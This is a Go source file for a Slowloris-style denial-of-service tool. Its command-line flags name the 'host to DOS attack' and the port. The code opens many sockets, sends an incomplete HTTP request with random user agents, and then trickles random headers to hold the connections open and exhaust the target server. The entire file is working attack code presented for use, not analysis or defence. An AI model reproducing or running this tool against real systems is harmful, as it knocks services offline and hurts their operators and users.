package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

type Config struct {
	host            string
	port            int
	numSockets      int
	randomUserAgent bool
	useHttps        bool
	sleepTime       int
	agentsPath      string
}

type Socket struct {
	net.Conn
}

type ThreadSafeCounter struct {
	v   int
	mux *sync.RWMutex
}

func main() {
	config := parseFlags()
	agents := getAgentsOrPanic(config)
	counter := ThreadSafeCounter{v: 0, mux: &sync.RWMutex{}}

	for {
		counter.mux.RLock()
		fmt.Println("Current sockets:", counter.v)
		counter.mux.RUnlock()
		updateSockets(config, agents, counter)

		<-time.Tick(time.Second * time.Duration(config.sleepTime))
	}
}

func parseFlags() Config {
	var config Config
	flag.StringVar(&config.host, "host", "127.0.0.1", "host to DOS attack")
	flag.IntVar(&config.port, "port", 80, "port to DOS attack")
	flag.IntVar(&config.numSockets, "numSockets", 100, "number of sockets to use")
	flag.BoolVar(&config.randomUserAgent, "randomUserAgent", false, "randomize user agents")
	flag.BoolVar(&config.useHttps, "useHttps", false, "use HTTPS for the requests")
	flag.IntVar(&config.sleepTime, "sleepTime", 10, "time to sleep between requests")
	flag.StringVar(&config.agentsPath, "agentsPath", "agents.json", "path to the user agents file")

	flag.Parse()

	return config
}

func getAgentsOrPanic(config Config) []string {
	agentsJsonFile, err := os.Open(config.agentsPath)
	if err != nil {
		panic(err)
	}
	defer agentsJsonFile.Close()

	var agents []string
	jsonParser := json.NewDecoder(agentsJsonFile)
	if err = jsonParser.Decode(&agents); err != nil {
		panic(err)
	}

	return agents
}

func initSocket(config Config) (Socket, error) {
	var conn net.Conn
	var err error

	if config.useHttps {
		conn, err = tls.Dial(
			"tcp",
			fmt.Sprintf("%s:%d", config.host, config.port),
			&tls.Config{InsecureSkipVerify: true},
		)
	} else {
		conn, err = net.Dial(
			"tcp",
			fmt.Sprintf("%s:%d", config.host, config.port),
		)
	}
	if err != nil {
		return Socket{}, err
	}

	return Socket{Conn: conn}, nil
}

func (s *Socket) sendLine(line string) error {
	_, err := s.Write([]byte(line + "\r\n"))
	return err
}

func (s *Socket) sendHeader(key, value string) error {
	err := s.sendLine(fmt.Sprintf("%s: %s", key, value))
	return err
}

func updateSockets(config Config, agents []string, counter ThreadSafeCounter) {
	counter.mux.RLock()
	v := counter.v
	counter.mux.RUnlock()

	for i := 0; i < config.numSockets-v; i++ {
		go func() {
			counter.updateV(1)
			randomAgent := agents[rand.Intn(len(agents))]
			socket, err := initSocket(config)
			if err != nil {
				println("Error connecting", err.Error())
				counter.updateV(-1)
				return
			}

			err = socket.sendLine(fmt.Sprintf("GET /?%d HTTP/1.1", rand.Intn(1000000)))
			if err != nil {
				println("Error writing", err.Error())
				counter.updateV(-1)
				return
			}

			err = socket.sendHeader("User-Agent", randomAgent)
			if err != nil {
				println("Error writing", err.Error())
				counter.updateV(-1)
				return
			}

			for {
				<-time.Tick(time.Second * time.Duration(config.sleepTime))
				err = socket.sendHeader(fmt.Sprintf("X-%d", rand.Intn(1000000)), strconv.Itoa(rand.Intn(1000000)))
				if err != nil {
					println("Error writing", err.Error())
					counter.updateV(-1)
					return
				}
			}
		}()
	}
}

func (tsc *ThreadSafeCounter) updateV(dv int) {
	tsc.mux.Lock()
	tsc.v += dv
	tsc.mux.Unlock()
}
